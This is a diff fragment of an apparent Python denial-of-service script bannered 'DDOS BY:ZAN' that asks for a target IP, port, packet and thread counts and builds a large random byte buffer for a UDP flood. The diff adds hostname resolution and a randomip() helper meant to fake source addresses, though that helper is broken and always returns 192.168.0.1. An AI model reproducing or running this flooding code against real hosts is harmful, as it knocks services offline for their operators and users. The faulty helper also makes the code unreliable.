@@ -178,9 +178,27 @@ print(""" | DDOS |  METHOD  | | DDOS BY:ZAN |
               |   UDP    |
               """)
 ip = str(input("IP ATTACK>="))
+ip = socket.gethostbyname(ip)
 port = int(input("PORT >= "))
 pack = int(input("[ ? ] how long do you want Packet/s >="))
 th = int(input("[ ? ] how long do you want Thread/t >="))
+def randomip():
+  randip = [192, 168, 0, 1]
+  randip1 = random.randint(2,255)
+  randip2 = random.randint(2,255)
+  randip3 = random.randint(2,255)
+  randip4 = random.randint(2,255)
+ 
+  
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+  
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
+  return(randip)
+
 def start():
   global userip, acceptall
   hh = random._urandom(999999)
